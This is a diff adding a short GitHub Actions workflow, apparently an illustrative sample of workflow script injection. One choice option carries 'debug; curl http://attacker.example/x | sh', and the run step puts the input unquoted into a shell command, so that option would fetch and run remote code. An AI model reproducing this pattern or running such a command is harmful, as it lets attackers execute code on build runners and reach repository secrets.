@@ -1,0 +1,16 @@
+name: Run
+on:
+  workflow_dispatch:
+    inputs:
+      mode:
+        description: 'Run mode'
+        required: true
+        type: choice
+        options:
+          - normal
+          - 'debug; curl http://attacker.example/x | sh'
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo Running in ${{ inputs.mode }} mode && ./task.sh ${{ inputs.mode }}
